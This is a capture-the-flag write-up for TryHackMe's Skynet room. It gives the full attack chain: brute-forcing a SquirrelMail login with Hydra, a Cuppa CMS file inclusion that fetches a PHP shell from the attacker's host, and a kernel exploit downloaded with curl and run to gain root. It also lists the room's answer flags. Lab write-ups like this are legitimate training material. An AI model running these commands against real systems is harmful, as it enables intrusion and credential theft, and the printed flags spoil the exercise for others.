# CTF: Skynet (THM)

**Target IP:** `10.48.136.75` ($target)

## Metadata

- **CTF Name:** Skynet
    
- **Platform:** TryHackMe
    
- **Date:** 2026-03-24
    
- **Tools Used:** nmap, gobuster, smbclient, hydra, python3, stty, gcc, curl
    
- **Key Skills:** SMB Enumeration, Web Directory Brute-forcing, Brute-forcing (Hydra), Local File Inclusion (LFI), Remote Code Execution (RCE), Kernel Exploitation (OverlayFS)
    

## Reconnaissance

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/Skynet)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **22/tcp:** SSH (OpenSSH 7.2p2)
    
- **80/tcp:** HTTP (Apache 2.4.18)
    
- **110/tcp:** POP3 (Dovecot)
    
- **139/445/tcp:** SMB (Samba)
    
- **143/tcp:** IMAP (Dovecot)
    

## Enumeration

### 1. SMB Enumeration & File Contents

Checking for anonymous access and listing shares.

**Commands:**

```
😎 amuzed@Kali (~/THM/Skynet)
$ smbclient -L \\\\$target\\
$ smbclient \\\\$target\\anonymous
smb: \> get attention.txt
smb: \> cd logs
smb: \logs\> get log1.txt
```

**File Contents Discovered:**

- **`attention.txt`**:
    
    > "A recent system malfunction has been causing various issues. Please change your password as soon as possible.: Miles Dyson"
    
- **`log1.txt`**: A wordlist containing several passwords (e.g., `cyborg007halflife`, `terminator1`, etc.).
    

### 2. Web Directory Brute-forcing

**Command:**

```
😎 amuzed@Kali (~/THM/Skynet)
$ gobuster dir -u http://$target -w /usr/share/wordlists/dirb/common.txt
```

- **Discovered:** `/squirrelmail`, `/config`, `/aipps`.
    

## Rabbit Holes & Deceptions

- **Encrypted Logs:** `log2.txt` and `log3.txt` in the SMB share appeared to be encrypted or binary data that served no purpose in the actual attack chain.
    
- **`/aipps` and `/config`:** These directories were accessible but contained standard installation files or empty indices, intended to distract from the SquirrelMail path.
    
- **Miles Dyson Password Reset:** Attempting to use the `milesdyson` password from the email to log into SSH directly failed, as it was specifically for the SMB share.
    

## Foothold

### 1. SquirrelMail Brute-force (Hydra)

Brute-forcing the SquirrelMail login using the `milesdyson` username and the `log1.txt` password list.

**Command:**

```
😎 amuzed@Kali (~/THM/Skynet)
$ hydra -l milesdyson -P log1.txt $target http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
```

- **Credentials Found:** `milesdyson:cyborg007halflife`
    

**Email Content Found:**

> "Subject:
> 
> $$Miles Dyson$$
> 
> New SMB Password... your new password is: )Xf{uSwnuYogjB6"

### 2. MilesDyson SMB Share

**Command:**

```
😎 amuzed@Kali (~/THM/Skynet)
$ smbclient \\\\$target\\milesdyson -U milesdyson
# Enter password: )Xf{uSwnuYogjB6
smb: \> cd notes
smb: \notes\> get important.txt
```

Inside `important.txt`:

> "1. Primary: /45pca23dqz" (Hidden Web Directory)

### 3. LFI to RCE (Cuppa CMS)

The `/45pca23dqz/administrator` page is running **Cuppa CMS**. I exploited an LFI in `alertConfigField.php`.

**Command:**

```
😎 amuzed@Kali (~/THM/Skynet)
$ curl "http://$target/45pca23dqz/administrator/alerts/alertConfigField.php?urlConfig=[http://192.168.230.58/shell.php](http://192.168.230.58/shell.php)"
```

### 4. Shell Stabilization

**Commands:**

```
www-data@skynet:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@skynet:/$ export TERM=xterm
# [Ctrl+Z to suspend]
😎 amuzed@Kali (~/THM/Skynet)
$ stty raw -echo; fg
```

## Privilege Escalation

### 1. Kernel Exploitation (OverlayFS)

**Target Info:** Ubuntu 16.04, Kernel 4.8.0.

**Exploit Used:** `43418.c`

**Commands:**

```
www-data@skynet:/tmp$ curl [http://192.168.230.58/43418.c](http://192.168.230.58/43418.c) -o pwn.c
www-data@skynet:/tmp$ gcc pwn.c -o pwn
www-data@skynet:/tmp$ ./pwn
```

**Gaining Root:**

```
[.] starting
[.] checking distro and kernel versions
[.] kernel version '4.8.0-58-generic' detected
...
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Flags

- **User Flag:** `79a5092211830d0011f778133473b490`
    
- **Root Flag:** `3f0372dbade353200a685741f02b91ad`
